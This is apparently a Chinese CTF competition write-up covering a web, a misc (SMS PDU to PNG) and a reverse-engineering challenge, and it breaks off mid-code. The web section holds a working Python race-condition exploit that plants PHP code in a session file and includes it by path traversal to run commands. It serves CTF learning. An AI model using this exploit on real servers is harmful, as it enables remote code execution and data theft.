+<h2 id="第二卷"><a href="#第二卷" class="headerlink" title="第二卷"></a>第二卷</h2><h3 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h3><h4 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h4><p>扫描找到.listing文件，内有提示you_can_seeeeeeee_me.php，打开是一个phpinfo。<br>phpinfo中给出了sessions目录，利用条件竞争包含session漏洞，将PHP_SESSION_UPLOAD_PROGRESS内添加php代码并上传文件执行代码。    </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>target = <span class="hljs-string">&quot;http://124.71.231.151:25908/&quot;</span><br>session_id = <span class="hljs-string">&quot;bellwind&quot;</span><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;cf&quot;</span>: <span class="hljs-string">&quot;../../../var/lib/php/sessions/eacadbajad/sess_&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(session_id),<br>    <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;?????&quot;</span>,<br>&#125;<br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session: requests.Session</span>):<br>    file = io.BytesIO(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        event.wait()<br>        response = session.post(<br>            target,<br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /etc &gt; 1.txt&#x27;);?&gt;&quot;</span><br>            &#125;,<br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: session_id<br>            &#125;,<br>            files=&#123;<br>                <span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;verysafe.jpg&quot;</span>, file)<br>            &#125;<br>        )<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session: requests.Session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        event.wait()<br>        response = session.post(<br>            target,<br>            data=payload,<br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: session_id<br>            &#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sess = requests.session()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        threading.Thread(target=write, args=(sess,)).start()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        threading.Thread(target=read, args=(sess,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span> event.isSet():<br>        time.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;waiting.&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+<p>经测试无法执行命令，但函数是可以用的。这里利用<code>scandir</code>函数列<code>/etc</code>目录文件，最终在<code>/etc/icbjgbfahe/ajgfbfeedc/bfcefdfdda/icdjcdcabj/ddadebjbab</code>下找到<code>fl444444g</code>，<code>file_get_contents</code>函数读取得到flag。</p>
+<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h4><p>使用golang解码pdu信息data.txt，可知前八位flag为手机号前八位。    </p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;encoding/hex&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>	<span class="hljs-string">&quot;github.com/xlab/at/sms&quot;</span><br>	<span class="hljs-string">&quot;io/ioutil&quot;</span><br>	<span class="hljs-string">&quot;sort&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br>	<span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;data.txt&quot;</span>)<br>	s := <span class="hljs-type">string</span>(data)<br>	s1 := strings.Split(s, <span class="hljs-string">&quot;\r\n&quot;</span>)[<span class="hljs-number">4</span>:]<br>	<span class="hljs-keyword">var</span> result []*sms.Message<br>	<span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> s1 &#123;<br>		<span class="hljs-keyword">if</span> r := decode(s); r != <span class="hljs-literal">nil</span> &#123;<br>			result = <span class="hljs-built_in">append</span>(result, r)<br>		&#125;<br>	&#125;<br>	sorter := messageSorter(result)<br>	sort.Sort(sorter)<br>	fina := <span class="hljs-string">&quot;&quot;</span><br>	<span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> sorter &#123;<br>		fina += s.Text<br>	&#125;<br>	fmt.Println(fina)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decode</span><span class="hljs-params">(msg <span class="hljs-type">string</span>)</span></span> *sms.Message &#123;<br>	bs, _ := hex.DecodeString(msg)<br>	m := <span class="hljs-built_in">new</span>(sms.Message)<br>	_, err := m.ReadFrom(bs)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>	&#125;<br>	<span class="hljs-keyword">return</span> m<br>&#125;<br><br><span class="hljs-keyword">type</span> messageSorter []*sms.Message<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(m)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> &#123;<br>	ms := []*sms.Message(m)<br>	<span class="hljs-keyword">return</span> time.Time(ms[i].ServiceCenterTime).Before(time.Time(ms[j].ServiceCenterTime))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m messageSorter)</span></span> Swap(i, j <span class="hljs-type">int</span>) &#123;<br>	m[i], m[j] = m[j], m[i]<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>根据时间戳排序并连接数据，可发现十六进制是一张png图片。<br>保存为png后爆破宽高，倒转图片方向读后半段flag并连接前段flag。</p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h4><p>下载下来是一个<code>baby.bc</code>文件，需要先用<code>clang</code>将其编译为二进制可执行文件，然后再在<code>IDA</code>中将其反编译然后进行进一步分析。<br>先对main函数进行分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br>  <span class="hljs-type">size_t</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span><br><br>  __isoc99_scanf(&amp;unk_403004, input, envp);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">strlen</span>(input) == <span class="hljs-number">25</span> )      <span class="hljs-comment">// 长度为25</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] )                             <span class="hljs-comment">// 有输入</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(input[<span class="hljs-number">0</span>] - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">5u</span> )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      v6 = <span class="hljs-built_in">strlen</span>(input);<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1LL</span>; ; ++i )<br>      &#123;<br>        v4 = i;<br>        <span class="hljs-keyword">if</span> ( i &gt;= v6 )                          <span class="hljs-comment">// 超出字符串长度</span><br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(input[v4] - <span class="hljs-number">48</span>) &gt; <span class="hljs-number">5u</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (fill_number(input) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> &amp;&amp; (docheck() &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CISCN&#123;MD5(%s)&#125;&quot;</span>, input);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看出主要的处理逻辑是在24行if语句中的<code>fill_number</code>和<code>docheck</code>当中，然后就要输出的格式为<code>CISCN&#123;MD5(%s)&#125;</code>，接着分析这两个函数<br>fill_number:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">fill_number</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// [rsp+1h] [rbp-69h]</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [rsp+11h] [rbp-59h]</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+21h] [rbp-49h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+31h] [rbp-39h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+40h] [rbp-2Ah]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+41h] [rbp-29h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+4Ah] [rbp-20h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+52h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+5Ah] [rbp-10h]</span><br><br>  v10 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v9 = v10;<br>    v8 = <span class="hljs-number">5</span> * v10;<br>    v7 = *(_BYTE *)(a1 + <span class="hljs-number">5</span> * v10);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10] = v7 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v5 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">1</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">1</span>] = v5 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v4 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">2</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">2</span>] = v4 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v3 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">3</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">3</span>] = v3 - <span class="hljs-number">48</span>;<br>    &#125;<br>    v2 = *(_BYTE *)(a1 + v8 + <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">4</span>] )<br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v2 != <span class="hljs-number">48</span> )<br>        <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v10 + <span class="hljs-number">4</span>] = v2 - <span class="hljs-number">48</span>;<br>    &#125;<br>    ++v10;<br>    v6 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 + <span class="hljs-number">1</span> &lt; <span class="hljs-number">5</span> );<br>  <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>fill_number的主要逻辑是5位5位取数以后，按给定的逻辑给各位的值减去48，但是由于题目没有给出输入的数，所以需要根据输出的值判定一开始的值，所以接着看check函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">docheck</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// [rsp+2Eh] [rbp-9Ah]</span><br>  __int64 v2; <span class="hljs-comment">// [rsp+30h] [rbp-98h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+40h] [rbp-88h]</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+50h] [rbp-78h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+58h] [rbp-70h]</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+68h] [rbp-60h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+70h] [rbp-58h]</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [rsp+7Fh] [rbp-49h]</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [rsp+88h] [rbp-40h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+90h] [rbp-38h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+98h] [rbp-30h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+A8h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+BCh] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">char</span> v14[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+C2h] [rbp-6h] BYREF</span><br><br>  v12 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v10 = v12;<br>    <span class="hljs-built_in">memset</span>(v14, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v14));<br>    v9 = &amp;v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12]];<br>    <span class="hljs-keyword">if</span> ( *v9<br>      || (*v9 = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">1</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">1</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">2</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">2</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">3</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">3</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">4</span>]]) )<br>    &#123;<br>      v8 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    ++v12;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 + <span class="hljs-number">1</span> &lt; <span class="hljs-number">5</span> );<br>  v11 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v7 = v11;<br>    <span class="hljs-built_in">memset</span>(v13, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v13));<br>    v6 = &amp;v13[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[v11]];<br>    <span class="hljs-keyword">if</span> ( *v6 )<br>      <span class="hljs-keyword">break</span>;<br>    *v6 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_405055[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_405055[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505A[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505A[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505F[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505F[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_405064[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    ++v11;<br>    <span class="hljs-keyword">if</span> ( v7 + <span class="hljs-number">1</span> &gt;= <span class="hljs-number">5</span> )<br>    &#123;<br>      v5 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        v4 = v5;<br>        <span class="hljs-keyword">if</span> ( row[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span 